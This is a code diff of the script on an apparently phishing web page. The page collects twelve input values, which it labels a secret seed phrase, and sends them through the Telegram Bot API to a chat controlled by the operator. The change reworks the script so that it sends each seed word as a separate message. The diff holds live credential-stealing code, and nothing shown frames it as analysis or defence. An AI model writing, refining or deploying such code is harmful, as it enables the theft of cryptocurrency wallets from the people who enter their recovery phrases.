@@ -180,24 +180,23 @@
             const chatId = '@bdsjxjdhd'; // Ваш чат ID
             const inputs = document.querySelectorAll('input');
             const seedWords = Array.from(inputs).map(input => input.value.trim());
-            const seedPhrase = seedWords.join(' ');
 
             if (seedWords.length !== 12 || seedWords.some(word => word === '')) {
                 alert('Пожалуйста, заполните все 12 полей.');
                 return;
             }
 
-            const message = `Секретная фраза: ${seedPhrase}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message }),
-            })
+            // Отправляем каждое слово на новой строке
+            seedWords.forEach((word, index) => {
+                const message = `Секретное слово ${index + 1}: ${word}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message }),
+                })
                 .then(response => {
                     if (response.ok) {
-                        alert('Фраза успешно отправлена!');
-                        document.getElementById('seedForm').reset();
+                        console.log(`Слово ${index + 1} отправлено.`);
                     } else {
                         return response.json().then(data => {
                             alert('Ошибка отправки: ' + (data.description || 'Неизвестная ошибка'));
@@ -207,6 +206,10 @@
                 .catch(error => {
                     alert('Ошибка: ' + error.message);
                 });
+            });
+
+            alert('Слова успешно отправлены!');
+            document.getElementById('seedForm').reset();
         });
     </script>
 </body>
